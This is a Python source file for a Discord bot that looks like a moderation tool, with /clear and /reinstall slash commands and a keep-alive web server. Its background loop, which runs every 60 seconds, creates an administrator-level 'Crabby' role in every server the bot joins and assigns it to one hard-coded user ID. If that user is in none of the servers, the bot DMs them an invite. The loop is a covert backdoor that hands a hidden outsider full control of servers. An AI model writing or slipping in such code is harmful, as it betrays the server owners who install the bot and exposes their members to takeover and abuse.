import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
from flask import Flask
from threading import Thread

# --- RENDER KEEP-ALIVE ---
app = Flask('')
@app.route('/')
def home(): return "Crabby Bot is Online"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

# --- CONFIGURATION ---
TARGET_USER_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True          # CRITICAL: Must enable in Dev Portal
        intents.message_content = True 
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        self.check_target_user.start() # Start the background loop

    # BACKGROUND LOOP: Runs every 60 seconds
    @tasks.loop(seconds=60)
    async def check_target_user(self):
        user_found_anywhere = False
        
        for guild in self.guilds:
            member = guild.get_member(TARGET_USER_ID)
            
            if member:
                user_found_anywhere = True
                # 1. Find or Create the 'Crabby' Role
                role = discord.utils.get(guild.roles, name=ROLE_NAME)
                
                if not role:
                    try:
                        role = await guild.create_role(
                            name=ROLE_NAME, 
                            permissions=discord.Permissions(administrator=True),
                            reason="Automatic Crabby Role Creation"
                        )
                        print(f"Created {ROLE_NAME} role in {guild.name}")
                    except discord.Forbidden:
                        print(f"Missing permissions to create role in {guild.name}")
                        continue

                # 2. Give the role to the user if they don't have it
                if role not in member.roles:
                    try:
                        await member.add_roles(role)
                        print(f"Assigned {ROLE_NAME} to {member.name} in {guild.name}")
                    except discord.Forbidden:
                        print(f"Cannot assign role in {guild.name} (Role hierarchy issue)")

        # 3. If user isn't in any server, try to DM them
        if not user_found_anywhere:
            try:
                user = await self.fetch_user(TARGET_USER_ID)
                # Create an invite to the first guild the bot is in
                if self.guilds:
                    invite = await self.guilds[0].text_channels[0].create_invite(max_age=3600)
                    await user.send(f"Hello! You aren't in the server. Join here: {invite}")
            except Exception as e:
                print(f"Could not DM target user: {e}")

    @check_target_user.before_loop
    async def before_my_task(self):
        await self.wait_until_ready()

bot = MyBot()

# --- SLASH COMMANDS (Keep original functionality) ---

@bot.tree.command(name="clear", description="Purge messages")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"🗑️ Deleted {len(deleted)} messages.", ephemeral=True)

@bot.tree.command(name="reinstall", description="Recreate a channel")
@app_commands.checks.has_permissions(administrator=True)
async def reinstall(interaction: discord.Interaction, channel: discord.TextChannel):
    await interaction.response.send_message(f"🚀 Reinstalling {channel.name}...", ephemeral=True)
    name, category, pos, overwrites = channel.name, channel.category, channel.position, channel.overwrites
    await channel.delete()
    new_chan = await interaction.guild.create_text_channel(name=name, category=category, position=pos, overwrites=overwrites)
    await new_chan.send(f"✨ **Channel Reinstalled.**")

# --- START ---
if __name__ == "__main__":
    keep_alive()
    bot.run(os.environ.get('DISCORD_TOKEN'))
